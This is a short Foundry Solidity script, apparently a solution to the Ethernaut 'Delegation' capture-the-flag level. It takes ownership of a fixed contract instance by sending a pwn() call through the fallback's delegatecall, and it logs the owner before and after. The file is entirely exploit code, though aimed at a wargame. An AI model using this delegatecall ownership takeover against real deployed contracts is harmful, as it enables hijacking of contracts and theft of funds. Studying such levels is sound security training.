// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instance/Delegate.sol";
import "forge-std/Script.sol";

contract Level6 is Script {
    Delegation instance = Delegation(0x3Ca8f9C04c7e3E1624Ac2008F92f6F366A869444);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Owner: ", instance.owner());
        (bool success, ) = address(instance).call(abi.encodeWithSignature("pwn()"));
        console.log("Function call returned: ", success);
        console.log("Owner now: ", instance.owner());
        vm.stopBroadcast();
    }
}